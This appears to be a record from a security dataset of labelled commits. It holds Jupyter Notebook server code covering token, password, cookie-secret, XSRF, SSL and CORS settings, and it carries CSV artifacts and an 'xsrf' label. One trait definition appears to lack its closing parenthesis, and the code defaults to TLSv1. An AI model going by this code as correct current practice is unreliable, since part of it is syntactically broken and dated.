            return 'localhost'

    @validate('ip')
    def _valdate_ip(self, proposal):
        value = proposal['value']
        if value == u'*':
            value = u''
        return value

    port = Integer(8888, config=True,
        help=""The port the notebook server will listen on.""
    )

    port_retries = Integer(50, config=True,
        help=""The number of additional ports to try if the specified port is not available.""
    )

    certfile = Unicode(u'', config=True, 
        help=""""""The full path to an SSL/TLS certificate file.""""""
    )
    
    keyfile = Unicode(u'', config=True, 
        help=""""""The full path to a private key file for usage with SSL/TLS.""""""
    )
    
    client_ca = Unicode(u'', config=True,
        help=""""""The full path to a certificate authority certificate for SSL/TLS client authentication.""""""
    )
    
    cookie_secret_file = Unicode(config=True,
        help=""""""The file where the cookie secret is stored.""""""
    )

    @default('cookie_secret_file')
    def _default_cookie_secret_file(self):
        return os.path.join(self.runtime_dir, 'notebook_cookie_secret')
    
    cookie_secret = Bytes(b'', config=True,
        help=""""""The random bytes used to secure cookies.
        By default this is a new random number every time you start the Notebook.
        Set it to a value in a config file to enable logins to persist across server sessions.
        
        Note: Cookie secrets should be kept private, do not share config files with
        cookie_secret stored in plaintext (you can read the value from a file).
        """"""
    )
    
    @default('cookie_secret')
    def _default_cookie_secret(self):
        if os.path.exists(self.cookie_secret_file):
            with io.open(self.cookie_secret_file, 'rb') as f:
                return f.read()
        else:
            secret = encodebytes(os.urandom(1024))
            self._write_cookie_secret_file(secret)
            return secret
    
    def _write_cookie_secret_file(self, secret):
        """"""write my secret to my secret_file""""""
        self.log.info(""Writing notebook server cookie secret to %s"", self.cookie_secret_file)
        with io.open(self.cookie_secret_file, 'wb') as f:
            f.write(secret)
        try:
            os.chmod(self.cookie_secret_file, 0o600)
        except OSError:
            self.log.warning(
                ""Could not set permissions on %s"",
                self.cookie_secret_file
            )

    token = Unicode('<generated>',
        help=""""""Token used for authenticating first-time connections to the server.

        When no password is enabled,
        the default is to generate a new, random token.

        Setting to an empty string disables authentication altogether, which is NOT RECOMMENDED.
        """"""
    ).tag(config=True)

    one_time_token = Unicode(
        help=""""""One-time token used for opening a browser.

        Once used, this token cannot be used again.
        """"""
    )

    _token_generated = True

    @default('token')
    def _token_default(self):
        if self.password:
            # no token if password is enabled
            self._token_generated = False
            return u''
        else:
            self._token_generated = True
            return binascii.hexlify(os.urandom(24)).decode('ascii')

    @observe('token')
    def _token_changed(self, change):
        self._token_generated = False

    password = Unicode(u'', config=True,
                      help=""""""Hashed password to use for web authentication.

                      To generate, type in a python/IPython shell:

                        from notebook.auth import passwd; passwd()

                      The string should be of the form type:salt:hashed-password.
                      """"""
    )

    password_required = Bool(False, config=True,
                      help=""""""Forces users to use a password for the Notebook server.
                      This is useful in a multi user environment, for instance when
                      everybody in the LAN can access each other's machine though ssh.

                      In such a case, server the notebook server on localhost is not secure
                      since any user can connect to the notebook server via ssh.

                      """"""

    disable_check_xsrf = Bool(False, config=True,
        help=""""""Disable cross-site-request-forgery protection

        Jupyter notebook 4.3.1 introduces protection from cross-site request forgeries,
        requiring API requests to either:

        - originate from the (validated with XSRF cookie and token), or
        - authenticate with a token

        Some anonymous compute resources still desire the ability to run code,
        completely without authentication.
        These services can disable all authentication and security checks,
        with the full knowledge of what that implies.
        """"""
    )

    open_browser = Bool(True, config=True,
                        help=""""""Whether to open in a browser after starting.
                        The specific browser used is platform dependent and
                        determined by the python standard library `webbrowser`
                        module, unless it is overridden using the --browser
                        (NotebookApp.browser) configuration option.
                        """""")

    browser = Unicode(u'', config=True,
                      help=""""""Specify what command to use to invoke a web
                      browser when opening the notebook. If not specified, the
                      default browser will be determined by the `webbrowser`
                      standard library module, which allows setting of the
                      BROWSER environment variable to override it.
                      """""")
    
    webapp_settings = Dict(config=True,
        help=""DEPRECATED, use tornado_settings""
    )

    @observe('webapp_settings') 
    def _update_webapp_settings(self, change):
        self.log.warning(""\n    webapp_settings is deprecated, use tornado_settings.\n"")
        self.tornado_settings = change['new']
    
    tornado_settings = Dict(config=True,
            help=""Supply overrides for the tornado.web.Application that the ""
                 ""Jupyter notebook uses."")
    
    terminado_settings = Dict(config=True,
            help='Supply overrides for terminado. Currently only supports ""shell_command"".')

    cookie_options = Dict(config=True,
        help=""Extra keyword arguments to pass to `set_secure_cookie`.""
             "" See tornado's set_secure_cookie docs for details.""
    )
    ssl_options = Dict(config=True,
            help=""""""Supply SSL options for the tornado HTTPServer.
            See the tornado docs for details."""""")
    
    jinja_environment_options = Dict(config=True, 
            help=""Supply extra arguments that will be passed to Jinja environment."")

    jinja_template_vars = Dict(
        config=True,
        help=""Extra variables to supply to jinja templates when rendering."",
    )
    
    enable_mathjax = Bool(True, config=True,
        help=""""""Whether to enable MathJax for typesetting math/TeX

        MathJax is the javascript library Jupyter uses to render math/LaTeX. It is
        very large, so you may want to disable it if you have a slow internet
        connection, or for offline use of the notebook.

        When disabled, equations etc. will appear as their untransformed TeX source.
        """"""
    )

    @observe('enable_mathjax')
    def _update_enable_mathjax(self, change):
        """"""set mathjax url to empty if mathjax is disabled""""""
        if not change['new']:
            self.mathjax_url = u''

    base_url = Unicode('/', config=True,
                               help='''The base URL for the notebook server.

                               Leading and trailing slashes can be omitted,
                               and will automatically be added.
                               ''')

    @validate('base_url')
    def _update_base_url(self, proposal):
        value = proposal['value']
        if not value.startswith('/'):
            value = '/' + value
        elif not value.endswith('/'):
            value = value + '/'
        return value
    
    base_project_url = Unicode('/', config=True, help=""""""DEPRECATED use base_url"""""")

    @observe('base_project_url')
    def _update_base_project_url(self, change):
        self.log.warning(""base_project_url is deprecated, use base_url"")
        self.base_url = change['new']

    extra_static_paths = List(Unicode(), config=True,
        help=""""""Extra paths to search for serving static files.
        
        This allows adding javascript/css to be available from the notebook server machine,
        or overriding individual files in the IPython""""""
    )
    
    @property
    def static_file_path(self):
        """"""return extra paths + the default location""""""
        return self.extra_static_paths + [DEFAULT_STATIC_FILES_PATH]
    
    static_custom_path = List(Unicode(),
        help=""""""Path to search for custom.js, css""""""
    )

    @default('static_custom_path')
    def _default_static_custom_path(self):
        return [
            os.path.join(d, 'custom') for d in (
                self.config_dir,
                DEFAULT_STATIC_FILES_PATH)
        ]

    extra_template_paths = List(Unicode(), config=True,
        help=""""""Extra paths to search for serving jinja templates.

        Can be used to override templates from notebook.templates.""""""
    )

    @property
    def template_file_path(self):
        """"""return extra paths + the default locations""""""
        return self.extra_template_paths + DEFAULT_TEMPLATE_PATH_LIST

    extra_nbextensions_path = List(Unicode(), config=True,
        help=""""""extra paths to look for Javascript notebook extensions""""""
    )
    
    @property
    def nbextensions_path(self):
        """"""The path to look for Javascript notebook extensions""""""
        path = self.extra_nbextensions_path + jupyter_path('nbextensions')
        # FIXME: remove IPython nbextensions path after a migration period
        try:
            from IPython.paths import get_ipython_dir
        except ImportError:
            pass
        else:
            path.append(os.path.join(get_ipython_dir(), 'nbextensions'))
        return path

    websocket_url = Unicode("""", config=True,
        help=""""""The base URL for websockets,
        if it differs from the HTTP server (hint: it almost certainly doesn't).
        
        Should be in the form of an HTTP origin: ws[s]://hostname[:port]
        """"""
    )

    mathjax_url = Unicode("""", config=True,
        help=""""""A custom url for MathJax.js.
        Should be in the form of a case-sensitive url to MathJax,
        for example:  /static/components/MathJax/MathJax.js
        """"""
    )

    @default('mathjax_url')
    def _default_mathjax_url(self):
        if not self.enable_mathjax:
            return u''
        static_url_prefix = self.tornado_settings.get(""static_url_prefix"", ""static"")
        return url_path_join(static_url_prefix, 'components', 'MathJax', 'MathJax.js')
    
    @observe('mathjax_url')
    def _update_mathjax_url(self, change):
        new = change['new']
        if new and not self.enable_mathjax:
            # enable_mathjax=False overrides mathjax_url
            self.mathjax_url = u''
        else:
            self.log.info(""Using MathJax: %s"", new)

    mathjax_config = Unicode(""TeX-AMS-MML_HTMLorMML-full,Safe"", config=True,
        help=""""""The MathJax.js configuration file that is to be used.""""""
    )

    @observe('mathjax_config')
    def _update_mathjax_config(self, change):
        self.log.info(""Using MathJax configuration file: %s"", change['new'])

    contents_manager_class = Type(
        default_value=FileContentsManager,
        klass=ContentsManager,
        config=True,
        help='The notebook manager class to use.'
    )

    kernel_manager_class = Type(
        default_value=MappingKernelManager,
        config=True,
        help='The kernel manager class to use.'
    )

    session_manager_class = Type(
        default_value=SessionManager,
        config=True,
        help='The session manager class to use.'
    )

    config_manager_class = Type(
        default_value=ConfigManager,
        config = True,
        help='The config manager class to use'
    )

    kernel_spec_manager = Instance(KernelSpecManager, allow_none=True)

    kernel_spec_manager_class = Type(
        default_value=KernelSpecManager,
        config=True,
        help=""""""
        The kernel spec manager class to use. Should be a subclass
        of `jupyter_client.kernelspec.KernelSpecManager`.

        The Api of KernelSpecManager is provisional and might change
        without warning between this version of Jupyter and the next stable one.
        """"""
    )

    login_handler_class = Type(
        default_value=LoginHandler,
        klass=web.RequestHandler,
        config=True,
        help='The login handler class to use.',
    )

    logout_handler_class = Type(
        default_value=LogoutHandler,
        klass=web.RequestHandler,
        config=True,
        help='The logout handler class to use.',
    )

    trust_xheaders = Bool(False, config=True,
        help=(""Whether to trust or not X-Scheme/X-Forwarded-Proto and X-Real-Ip/X-Forwarded-For headers""
              ""sent by the upstream reverse proxy. Necessary if the proxy handles SSL"")
    )

    info_file = Unicode()

    @default('info_file')
    def _default_info_file(self):
        info_file = ""nbserver-%s.json"" % os.getpid()
        return os.path.join(self.runtime_dir, info_file)
    
    pylab = Unicode('disabled', config=True,
        help=""""""
        DISABLED: use %pylab or %matplotlib in the notebook to enable matplotlib.
        """"""
    )

    @observe('pylab')
    def _update_pylab(self, change):
        """"""when --pylab is specified, display a warning and exit""""""
        if change['new'] != 'warn':
            backend = ' %s' % change['new']
        else:
            backend = ''
        self.log.error(""Support for specifying --pylab on the command line has been removed."")
        self.log.error(
            ""Please use `%pylab{0}` or `%matplotlib{0}` in the notebook itself."".format(backend)
        )
        self.exit(1)

    notebook_dir = Unicode(config=True,
        help=""The directory to use for notebooks and kernels.""
    )

    @default('notebook_dir')
    def _default_notebook_dir(self):
        if self.file_to_run:
            return os.path.dirname(os.path.abspath(self.file_to_run))
        else:
            return py3compat.getcwd()

    @validate('notebook_dir')
    def _notebook_dir_validate(self, proposal):
        value = proposal['value']
        # Strip any trailing slashes
        # *except* if it's root
        _, path = os.path.splitdrive(value)
        if path == os.sep:
            return value
        value = value.rstrip(os.sep)
        if not os.path.isabs(value):
            # If we receive a non-absolute path, make it absolute.
            value = os.path.abspath(value)
        if not os.path.isdir(value):
            raise TraitError(""No such notebook dir: %r"" % value)
        return value

    @observe('notebook_dir')
    def _update_notebook_dir(self, change):
        """"""Do a bit of validation of the notebook dir.""""""
        # setting App.notebook_dir implies setting notebook and kernel dirs as well
        new = change['new']
        self.config.FileContentsManager.root_dir = new
        self.config.MappingKernelManager.root_dir = new

    # TODO: Remove me in notebook 5.0
    server_extensions = List(Unicode(), config=True,
        help=(""DEPRECATED use the nbserver_extensions dict instead"")
    )
    
    @observe('server_extensions')
    def _update_server_extensions(self, change):
        self.log.warning(""server_extensions is deprecated, use nbserver_extensions"")
        self.server_extensions = change['new']
        
    nbserver_extensions = Dict({}, config=True,
        help=(""Dict of Python modules to load as notebook server extensions.""
              ""Entry values can be used to enable and disable the loading of""
              ""the extensions. The extensions will be loaded in alphabetical ""
              ""order."")
    )

    reraise_server_extension_failures = Bool(
        False,
        config=True,
        help=""Reraise exceptions encountered loading server extensions?"",
    )

    iopub_msg_rate_limit = Float(1000, config=True, help=""""""(msgs/sec)
        Maximum rate at which messages can be sent on iopub before they are
        limited."""""")

    iopub_data_rate_limit = Float(1000000, config=True, help=""""""(bytes/sec)
        Maximum rate at which messages can be sent on iopub before they are
        limited."""""")

    rate_limit_window = Float(3, config=True, help=""""""(sec) Time window used to 
        check the message and data rate limits."""""")

    def parse_command_line(self, argv=None):
        super(NotebookApp, self).parse_command_line(argv)

        if self.extra_args:
            arg0 = self.extra_args[0]
            f = os.path.abspath(arg0)
            self.argv.remove(arg0)
            if not os.path.exists(f):
                self.log.critical(""No such file or directory: %s"", f)
                self.exit(1)
            
            # Use config here, to ensure that it takes higher priority than
            # anything that comes from the config dirs.
            c = Config()
            if os.path.isdir(f):
                c.NotebookApp.notebook_dir = f
            elif os.path.isfile(f):
                c.NotebookApp.file_to_run = f
            self.update_config(c)

    def init_configurables(self):
        self.kernel_spec_manager = self.kernel_spec_manager_class(
            parent=self,
        )
        self.kernel_manager = self.kernel_manager_class(
            parent=self,
            log=self.log,
            connection_dir=self.runtime_dir,
            kernel_spec_manager=self.kernel_spec_manager,
        )
        self.contents_manager = self.contents_manager_class(
            parent=self,
            log=self.log,
        )
        self.session_manager = self.session_manager_class(
            parent=self,
            log=self.log,
            kernel_manager=self.kernel_manager,
            contents_manager=self.contents_manager,
        )
        self.config_manager = self.config_manager_class(
            parent=self,
            log=self.log,
            config_dir=os.path.join(self.config_dir, 'nbconfig'),
        )

    def init_logging(self):
        # This prevents double log messages because tornado use a root logger that
        # self.log is a child of. The logging module dipatches log messages to a log
        # and all of its ancenstors until propagate is set to False.
        self.log.propagate = False
        
        for log in app_log, access_log, gen_log:
            # consistent log output name (NotebookApp instead of tornado.access, etc.)
            log.name = self.log.name
        # hook up tornado 3's loggers to our app handlers
        logger = logging.getLogger('tornado')
        logger.propagate = True
        logger.parent = self.log
        logger.setLevel(self.log.level)
    
    def init_webapp(self):
        """"""initialize tornado webapp and httpserver""""""
        self.tornado_settings['allow_origin'] = self.allow_origin
        if self.allow_origin_pat:
            self.tornado_settings['allow_origin_pat'] = re.compile(self.allow_origin_pat)
        self.tornado_settings['allow_credentials'] = self.allow_credentials
        self.tornado_settings['cookie_options'] = self.cookie_options
        self.tornado_settings['token'] = self.token
        if (self.open_browser or self.file_to_run) and not self.password:
            self.one_time_token = binascii.hexlify(os.urandom(24)).decode('ascii')
            self.tornado_settings['one_time_token'] = self.one_time_token

        # ensure default_url starts with base_url
        if not self.default_url.startswith(self.base_url):
            self.default_url = url_path_join(self.base_url, self.default_url)

        if self.password_required and (not self.password):
            self.log.critical(""Notebook servers are configured to only be run with a password."")
            self.log.critical(""Hint: run the following command to set a password"")
            self.log.critical(""\t$ python -m notebook.auth password"")
            sys.exit(1)

        self.web_app = NotebookWebApplication(
            self, self.kernel_manager, self.contents_manager,
            self.session_manager, self.kernel_spec_manager,
            self.config_manager,
            self.log, self.base_url, self.default_url, self.tornado_settings,
            self.jinja_environment_options
        )
        ssl_options = self.ssl_options
        if self.certfile:
            ssl_options['certfile'] = self.certfile
        if self.keyfile:
            ssl_options['keyfile'] = self.keyfile
        if self.client_ca:
            ssl_options['ca_certs'] = self.client_ca
        if not ssl_options:
            # None indicates no SSL config
            ssl_options = None
        else:
            # SSL may be missing, so only import it if it's to be used
            import ssl
            # Disable SSLv3 by default, since its use is discouraged.
            ssl_options.setdefault('ssl_version', ssl.PROTOCOL_TLSv1)
            if ssl_options.get('ca_certs', False):
                ssl_options.setdefault('cert_reqs', ssl.CERT_REQUIRED)
        
        self.login_handler_class.validate_security(self, ssl_options=ssl_options)
        self.http_server = httpserver.HTTPServer(self.web_app, ssl_options=ssl_options,
                                                 xheaders=self.trust_xheaders)

        success = None
        for port in random_ports(self.port, self.port_retries+1):
            try:
                self.http_server.listen(port, self.ip)
            except socket.error as e:
                if e.errno == errno.EADDRINUSE:
                    self.log.info('The port %i is already in use, trying another port.' % port)
                    continue
                elif e.errno in (errno.EACCES, getattr(errno, 'WSAEACCES', errno.EACCES)):
                    self.log.warning(""Permission to listen on port %i denied"" % port)
                    continue
                else:
                    raise
            else:
                self.port = port
                success = True
                break
        if not success:
            self.log.critical('ERROR: the notebook server could not be started because '
                              'no available port could be found.')
            self.exit(1)
    
    @property
    def display_url(self):
        ip = self.ip if self.ip else '[all ip addresses on your system]'
        url = self._url(ip)
        if self.token:
            # Don't log full token if it came from config
            token = self.token if self._token_generated else '...'
            url = url_concat(url, {'token': token})
        return url

    @property
    def connection_url(self):
        ip = self.ip if self.ip else 'localhost'
        return self._url(ip)

    def _url(self, ip):
        proto = 'https' if self.certfile else 'http'
        return ""%s://%s:%i%s"" % (proto, ip, self.port, self.base_url)

    def init_terminals(self):
        try:
            from .terminal import initialize
            initialize(self.web_app, self.notebook_dir, self.connection_url, self.terminado_settings)
            self.web_app.settings['terminals_available'] = True
        except ImportError as e:
            log = self.log.debug if sys.platform == 'win32' else self.log.warning
            log(""Terminals not available (error was %s)"", e)

    def init_signal(self):
        if not sys.platform.startswith('win') and sys.stdin.isatty():
            signal.signal(signal.SIGINT, self._handle_sigint)
        signal.signal(signal.SIGTERM, self._signal_stop)
        if hasattr(signal, 'SIGUSR1'):
            # Windows doesn't support SIGUSR1
            signal.signal(signal.SIGUSR1, self._signal_info)
        if hasattr(signal, 'SIGINFO'):
            # only on BSD-based systems
            signal.signal(signal.SIGINFO, self._signal_info)
    
    def _handle_sigint(self, sig, frame):
        """"""SIGINT handler spawns confirmation dialog""""""
        # register more forceful signal handler for ^C^C case
        signal.signal(signal.SIGINT, self._signal_stop)
        # request confirmation dialog in bg thread, to avoid
        # blocking the App
        thread = threading.Thread(target=self._confirm_exit)
        thread.daemon = True
        thread.start()
    
    def _restore_sigint_handler(self):
        """"""callback for restoring original SIGINT handler""""""
        signal.signal(signal.SIGINT, self._handle_sigint)
    
    def _confirm_exit(self):
        """"""confirm shutdown on ^C
        
        A second ^C, or answering 'y' within 5s will cause shutdown,
        otherwise original SIGINT handler will be restored.
        
        This doesn't work on Windows.
        """"""
        info = self.log.info
        info('interrupted')
        print(self.notebook_info())
        sys.stdout.write(""Shutdown this notebook server (y/[n])? "")
        sys.stdout.flush()
        r,w,x = select.select([sys.stdin], [], [], 5)
        if r:
            line = sys.stdin.readline()
            if line.lower().startswith('y') and 'n' not in line.lower():
                self.log.critical(""Shutdown confirmed"")
                ioloop.IOLoop.current().stop()
                return
        else:
            print(""No answer for 5s:"", end=' ')
        print(""resuming operation..."")
        # no answer, or answer is no:
        # set it back to original SIGINT handler
        # use IOLoop.add_callback because signal.signal must be called
        # from main thread
        ioloop.IOLoop.current().add_callback(self._restore_sigint_handler)
    
    def _signal_stop(self, sig, frame):
        self.log.critical(""received signal %s, stopping"", sig)
        ioloop.IOLoop.current().stop()

    def _signal_info(self, sig, frame):
        print(self.notebook_info())
    
    def init_components(self):
        """"""Check the components submodule, and warn if it's unclean""""""
        # TODO: this should still check, but now we use bower, not git submodule
        pass

    def init_server_extensions(self):
        """"""Load any extensions specified by config.

        Import the module, then call the load_jupyter_server_extension function,
        if one exists.
        
        The extension API is experimental, and may change in future releases.
        """"""
        
        # TODO: Remove me in notebook 5.0
        for modulename in self.server_extensions:
            # Don't override disable state of the extension if it already exist
            # in the new traitlet
            if not modulename in self.nbserver_extensions:
                self.nbserver_extensions[modulename] = True
        
        for modulename in sorted(self.nbserver_extensions):
            if self.nbserver_extensions[modulename]:
                try:
                    mod = importlib.import_module(modulename)
                    func = getattr(mod, 'load_jupyter_server_extension', None)
                    if func is not None:
                        func(self)
                except Exception:
                    if self.reraise_server_extension_failures:
                        raise
                    self.log.warning(""Error loading server extension %s"", modulename,
                                  exc_info=True)

    def init_mime_overrides(self):
        # On some Windows machines, an application has registered an incorrect
        # mimetype for CSS in the registry. Tornado uses this when serving
        # .css files, causing browsers to reject the stylesheet. We know the
        # mimetype always needs to be text/css, so we override it here.
        mimetypes.add_type('text/css', '.css')

    @catch_config_error
    def initialize(self, argv=None):
        super(NotebookApp, self).initialize(argv)
        self.init_logging()
        if self._dispatching:
            return
        self.init_configurables()
        self.init_components()
        self.init_webapp()
        self.init_terminals()
        self.init_signal()
        self.init_server_extensions()
        self.init_mime_overrides()

    def cleanup_kernels(self):
        """"""Shutdown all kernels.
        
        The kernels will shutdown themselves when this process no longer exists,
        but explicit shutdown allows the KernelManagers to cleanup the connection files.
        """"""
        self.log.info('Shutting down kernels')
        self.kernel_manager.shutdown_all()

    def notebook_info(self):
        ""Return the current working directory and the server url information""
        info = self.contents_manager.info_string() + ""\n""
        info += ""%d active kernels \n"" % len(self.kernel_manager._kernels)
        return info + ""The Jupyter Notebook is running at: %s"" % self.display_url

    def server_info(self):
        """"""Return a JSONable dict of information about this server.""""""
        return {'url': self.connection_url,
                'hostname': self.ip if self.ip else 'localhost',
                'port': self.port,
                'secure': bool(self.certfile),
                'base_url': self.base_url,
                'token': self.token,
                'notebook_dir': os.path.abspath(self.notebook_dir),
                'password': bool(self.password),
                'pid': os.getpid(),
               }

    def write_server_info_file(self):
        """"""Write the result of server_info() to the JSON file info_file.""""""
        with open(self.info_file, 'w') as f:
            json.dump(self.server_info(), f, indent=2, sort_keys=True)

    def remove_server_info_file(self):
        """"""Remove the nbserver-<pid>.json file created for this server.
        
        Ignores the error raised when the file has already been removed.
        """"""
        try:
            os.unlink(self.info_file)
        except OSError as e:
            if e.errno != errno.ENOENT:
                raise

    def start(self):
        """""" Start the Notebook server app, after initialization
        
        This method takes no arguments so all configuration and initialization
        must be done prior to calling this method.""""""

        if not self.allow_root:
            # check if we are running as root, and abort if it's not allowed
            try:
                uid = os.geteuid()
            except AttributeError:
                uid = -1 # anything nonzero here, since we can't check UID assume non-root
            if uid == 0:
                self.log.critical(""Running as root is not recommended. Use --allow-root to bypass."")
                self.exit(1)

        super(NotebookApp, self).start()

        info = self.log.info
        for line in self.notebook_info().split(""\n""):
            info(line)
        info(""Use Control-C to stop this server and shut down all kernels (twice to skip confirmation)."")

        self.write_server_info_file()

        if self.open_browser or self.file_to_run:
            try:
                browser = webbrowser.get(self.browser or None)
            except webbrowser.Error as e:
                self.log.warning('No web browser found: %s.' % e)
                browser = None
            
            if self.file_to_run:
                if not os.path.exists(self.file_to_run):
                    self.log.critical(""%s does not exist"" % self.file_to_run)
                    self.exit(1)

                relpath = os.path.relpath(self.file_to_run, self.notebook_dir)
                uri = url_escape(url_path_join('notebooks', *relpath.split(os.sep)))
            else:
                # default_url contains base_url, but so does connection_url
                uri = self.default_url[len(self.base_url):]
            if self.one_time_token:
                uri = url_concat(uri, {'token': self.one_time_token})
            if browser:
                b = lambda : browser.open(url_path_join(self.connection_url, uri),
                                          new=2)
                threading.Thread(target=b).start()

        if self.token and self._token_generated:
            # log full URL with generated token, so there's a copy/pasteable link
            # with auth info.
            self.log.critical('\n'.join([
                '\n',
                'Copy/paste this URL into your browser when you connect for the first time,',
                'to login with a token:',
                '    %s' % url_concat(self.connection_url, {'token': self.token}),
            ]))

        self.io_loop = ioloop.IOLoop.current()
        if sys.platform.startswith('win'):
            # add no-op to wake every 5s
            # to handle signals that may be ignored by the inner loop
            pc = ioloop.PeriodicCallback(lambda : None, 5000)
            pc.start()
        try:
            self.io_loop.start()
        except KeyboardInterrupt:
            info(""Interrupted..."")
        finally:
            self.remove_server_info_file()
            self.cleanup_kernels()

    def stop(self):
        def _stop():
            self.http_server.stop()
            self.io_loop.stop()
        self.io_loop.add_callback(_stop)


def list_running_servers(runtime_dir=None):
    """"""Iterate over the server info files of running notebook servers.
    
    Given a runtime directory, find nbserver-* files in the security directory,
    and yield dicts of their information, each one pertaining to
    a currently running notebook server instance.
    """"""
    if runtime_dir is None:
        runtime_dir = jupyter_runtime_dir()

    # The runtime dir might not exist
    if not os.path.isdir(runtime_dir):
        return

    for file in os.listdir(runtime_dir):
        if file.startswith('nbserver-'):
            with io.open(os.path.join(runtime_dir, file), encoding='utf-8') as f:
                info = json.load(f)

            # Simple check whether that process is really still running
            # Also remove leftover files from IPython 2.x without a pid field
            if ('pid' in info) and check_pid(info['pid']):
                yield info
            else:
                # If the process has died, try to delete its info file
                try:
                    os.unlink(os.path.join(runtime_dir, file))
                except OSError:
                    pass  # TODO: This should warn or log or something
#-----------------------------------------------------------------------------
# Main entry point
#-----------------------------------------------------------------------------

main = launch_new_instance = NotebookApp.launch_instance
/n/n/n",0,xsrf
5,73,d6f091c4439c174c7700776c0cee03053403f600,"/notebook/base/handlers.py/n/n""""""Base Tornado handlers for the notebook server.""""""

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

import functools
import json
import os
import re
import sys
import traceback
try:
    # py3
    from http.client import responses
except ImportError:
    from httplib import responses
try:
    from urllib.parse import urlparse # Py 3
except ImportError:
    from urlparse import urlparse # Py 2

from jinja2 import TemplateNotFound
from tornado import web, gen, escape
from tornado.log import app_log

from notebook._sysinfo import get_sys_info

from traitlets.config import Application
from ipython_genutils.path import filefind
from ipython_genutils.py3compat import string_types

import notebook
from notebook.utils import is_hidden, url_path_join, url_is_absolute, url_escape
from notebook.services.security import csp_report_uri

#-----------------------------------------------------------------------------
# Top-level handlers
#-----------------------------------------------------------------------------
non_alphanum = re.compile(r'[^A-Za-z0-9]')

sys_info = json.dumps(get_sys_info())

def log():
    if Application.initialized():
        return Application.instance().log
    else:
        return app_log

class AuthenticatedHandler(web.RequestHandler):
    """"""A RequestHandler with an authenticated user.""""""

    @property
    def content_security_policy(self):
        """"""The default Content-Security-Policy header
        
        Can be overridden by defining Content-Security-Policy in settings['headers']
        """"""
        return '; '.join([
            ""frame-ancestors 'self'"",
            # Make sure the report-uri is relative to the base_url
            ""report-uri "" + url_path_join(self.base_url, csp_report_uri),
        ])

    def set_default_headers(self):
        headers = self.settings.get('headers', {})

        if ""Content-Security-Policy"" not in headers:
            headers[""Content-Security-Policy""] = self.content_security_policy

        # Allow for overriding headers
        for header_name,value in headers.items() :
            try:
                self.set_header(header_name, value)
            except Exception as e:
                # tornado raise Exception (not a subclass)
                # if method is unsupported (websocket and Access-Control-Allow-Origin
                # for example, so just ignore)
                self.log.debug(e)
    
    def clear_login_cookie(self):
        self.clear_cookie(self.cookie_name)
    
    def get_current_user(self):
        if self.login_handler is None:
            return 'anonymous'
        return self.login_handler.get_user(self)

    def skip_check_origin(self):
        """"""Ask my login_handler if I should skip the origin_check
        
        For example: in the default LoginHandler, if a request is token-authenticated,
        origin checking should be skipped.
        """"""
        if self.login_handler is None or not hasattr(self.login_handler, 'should_check_origin'):
            return False
        return not self.login_handler.should_check_origin(self)

    @property
    def token_authenticated(self):
        """"""Have I been authenticated with a token?""""""
        if self.login_handler is None or not hasattr(self.login_handler, 'is_token_authenticated'):
            return False
        return self.login_handler.is_token_authenticated(self)

    @property
    def cookie_name(self):
        default_cookie_name = non_alphanum.sub('-', 'username-{}'.format(
            self.request.host
        ))
        return self.settings.get('cookie_name', default_cookie_name)
    
    @property
    def logged_in(self):
        """"""Is a user currently logged in?""""""
        user = self.get_current_user()
        return (user and not user == 'anonymous')

    @property
    def login_handler(self):
        """"""Return the login handler for this application, if any.""""""
        return self.settings.get('login_handler_class', None)

    @property
    def token(self):
        """"""Return the login token for this application, if any.""""""
        return self.settings.get('token', None)

    @property
    def one_time_token(self):
        """"""Return the one-time-use token for this application, if any.""""""
        return self.settings.get('one_time_token', None)

    @property
    def login_available(self):
        """"""May a user proceed to log in?

        This returns True if login capability is available, irrespective of
        whether the user is already logged in or not.

        """"""
        if self.login_handler is None:
            return False
        return bool(self.login_handler.get_login_available(self.settings))


class IPythonHandler(AuthenticatedHandler):
    """"""IPython-specific extensions to authenticated handling
    
    Mostly property shortcuts to IPython-specific settings.
    """"""

    @property
    def ignore_minified_js(self):
        """"""Wether to user bundle in template. (*.min files)
        
        Mainly use for development and avoid file recompilation
        """"""
        return self.settings.get('ignore_minified_js', False)

    @property
    def config(self):
        return self.settings.get('config', None)
    
    @property
    def log(self):
        """"""use the IPython log by default, falling back on tornado's logger""""""
        return log()

    @property
    def jinja_template_vars(self):
        """"""User-supplied values to supply to jinja templates.""""""
        return self.settings.get('jinja_template_vars', {})
    
    #---------------------------------------------------------------
    # URLs
    #---------------------------------------------------------------
    
    @property
    def version_hash(self):
        """"""The version hash to use for cache hints for static files""""""
        return self.settings.get('version_hash', '')
    
    @property
    def mathjax_url(self):
        url = self.settings.get('mathjax_url', '')
        if not url or url_is_absolute(url):
            return url
        return url_path_join(self.base_url, url)
    
    @property
    def mathjax_config(self):
        return self.settings.get('mathjax_config', 'TeX-AMS-MML_HTMLorMML-full,Safe')

    @property
    def base_url(self):
        return self.settings.get('base_url', '/')

    @property
    def default_url(self):
        return self.settings.get('default_url', '')

    @property
    def ws_url(self):
        return self.settings.get('websocket_url', '')

    @property
    def contents_js_source(self):
        self.log.debug(""Using contents: %s"", self.settings.get('contents_js_source',
            'services/built/contents'))
        return self.settings.get('contents_js_source', 'services/built/contents')
    
    #---------------------------------------------------------------
    # Manager objects
    #---------------------------------------------------------------
    
    @property
    def kernel_manager(self):
        return self.settings['kernel_manager']

    @property
    def contents_manager(self):
        return self.settings['contents_manager']
    
    @property
    def session_manager(self):
        return self.settings['session_manager']
    
    @property
    def terminal_manager(self):
        return self.settings['terminal_manager']
    
    @property
    def kernel_spec_manager(self):
        return self.settings['kernel_spec_manager']

    @property
    def config_manager(self):
        return self.settings['config_manager']

    #---------------------------------------------------------------
    # CORS
    #---------------------------------------------------------------
    
    @property
    def allow_origin(self):
        """"""Normal Access-Control-Allow-Origin""""""
        return self.settings.get('allow_origin', '')
    
    @property
    def allow_origin_pat(self):
        """"""Regular expression version of allow_origin""""""
        return self.settings.get('allow_origin_pat', None)
    
    @property
    def allow_credentials(self):
        """"""Whether to set Access-Control-Allow-Credentials""""""
        return self.settings.get('allow_credentials', False)
    
    def set_default_headers(self):
        """"""Add CORS headers, if defined""""""
        super(IPythonHandler, self).set_default_headers()
        if self.allow_origin:
            self.set_header(""Access-Control-Allow-Origin"", self.allow_origin)
        elif self.allow_origin_pat:
            origin = self.get_origin()
            if origin and self.allow_origin_pat.match(origin):
                self.set_header(""Access-Control-Allow-Origin"", origin)
        if self.allow_credentials:
            self.set_header(""Access-Control-Allow-Credentials"", 'true')
    
    def get_origin(self):
        # Handle WebSocket Origin naming convention differences
